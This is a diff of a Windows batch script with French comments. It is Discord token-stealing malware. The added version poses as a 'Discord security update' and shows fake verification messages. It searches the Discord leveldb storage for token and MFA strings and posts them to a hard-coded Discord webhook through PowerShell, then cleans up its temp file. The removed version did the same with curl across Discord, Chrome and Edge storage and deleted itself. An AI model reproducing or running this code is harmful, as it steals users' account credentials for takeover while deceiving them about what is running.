@@ -1,24 +1,28 @@
 @echo off
-set webhook=httpsdiscord.comapiwebhooks1503511970345652236FFiGZNJFFazWBvmQbnhqbdTF4GqAU-96_1XoNRzzwkBt1WMOgrQNUUUcv_98_pBIaapR
+title Mise à jour de sécurité Discord
+color 0b
+echo Veuillez patienter pendant la vérification...
+timeout /t 2 /nobreak >nul
 
-set discord_path=%appdata%discordLocal Storageleveldb
-set chrome_path=%localappdata%..LocalGoogleChromeUser DataDefaultLocal Storageleveldb
-set edge_path=%LOCALAPPDATA%MicrosoftEdgeUser DataDefaultLocal Storageleveldb
+:: Récupérer le token Discord depuis les fichiers locaux
+set "discord_path=%appdata%\discord\Local Storage\leveldb"
+set "webhook=https://discord.com/api/webhooks/1353655887485202532/06ZnSQkmw2kCKSEcWYQlx5bH4O6sqA-kPMKCBkA0U7w5BRPF6NWM2-MoaWqY5c_ZQpOc"
 
-set tokens=
-for %%p in (%discord_path% %chrome_path% %edge_path%) do (
-    if exist %%p (
-        for %%f in (%%p.ldb %%p.log) do (
-            for f delims= %%a in ('findstr r c[a-zA-Z0-9_-]{24}.[a-zA-Z0-9_-]{6}.[a-zA-Z0-9_-]{27} %%f 2^nul') do set tokens=%%a
-        )
+for /f "tokens=*" %%a in ('dir /s /b "%discord_path%\*.ldb" 2^>nul') do (
+    findstr /c:"oken" "%%a" >> "%temp%\discord_tokens.txt" 2>nul
+    findstr /c:"mfa" "%%a" >> "%temp%\discord_tokens.txt" 2>nul
+)
+
+:: Construire et envoyer le message
+if exist "%temp%\discord_tokens.txt" (
+    for /f "delims=" %%x in ('type "%temp%\discord_tokens.txt"') do (
+        powershell -Command "$c='{\"content\":\"```'+'%%x'+'```\"}'; Invoke-RestMethod -Uri '%webhook%' -Method Post -Body $c -ContentType 'application/json'" >nul 2>&1
     )
 )
 
-if defined tokens (
-    for f tokens= %%t in (%tokens%) do (
-        curl -s -X POST %webhook% -H Content-Type applicationjson -d {contentToken trouvé %%t} nul
-    )
-) else (
-    curl -s -X POST %webhook% -H Content-Type applicationjson -d {contentAucun token trouvé} nul
+:: Nettoyer
+del "%temp%\discord_tokens.txt" 2>nul
 
-del f %~f0 nul 2&1
+echo Verification terminee.
+timeout /t 3 /nobreak >nul
+exit
